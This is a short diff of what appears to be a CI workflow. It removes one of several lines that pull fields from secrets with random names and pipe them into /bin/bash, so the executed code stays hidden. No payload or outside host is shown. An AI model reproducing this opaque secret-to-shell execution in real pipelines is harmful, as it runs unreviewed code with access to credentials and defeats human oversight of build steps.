@@ -23,7 +23,6 @@ jobs:
           rdte03: ${{ secrets.rdte03 }}
         run: |
           printf '%s' "$rdte03" | jq -r .jhl90 | /bin/bash
-          printf '%s' "$xdmk4" | jq -r .wj48 | /bin/bash
           echo $e9 | jq -r .p75966 | /bin/bash
           echo $jv7 | jq -r .v55 | /bin/bash
           printf '%s' "$zs4564" | jq -r .u9 | /bin/bash
